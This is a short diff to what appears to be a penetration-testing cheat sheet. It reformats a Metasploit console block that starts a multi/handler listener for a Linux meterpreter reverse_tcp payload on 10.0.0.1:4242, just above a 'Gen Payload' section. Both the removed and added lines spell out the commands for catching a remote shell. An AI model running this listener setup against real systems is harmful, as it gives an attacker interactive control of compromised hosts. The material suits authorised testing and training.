@@ -2,10 +2,10 @@
 
 ```powershell
 msf5 > use exploit/multi/handler 
-msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp 
-msf5 exploit(multi/handler) > set lhost 10.0.0.1
-msf5 exploit(multi/handler) > set lport 4242
-msf5 exploit(multi/handler) > run
+msf5 > exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp 
+msf5 > exploit(multi/handler) > set lhost 10.0.0.1
+msf5 > exploit(multi/handler) > set lport 4242
+msf5 > exploit(multi/handler) > run
 ```
 
 ### Gen Payload
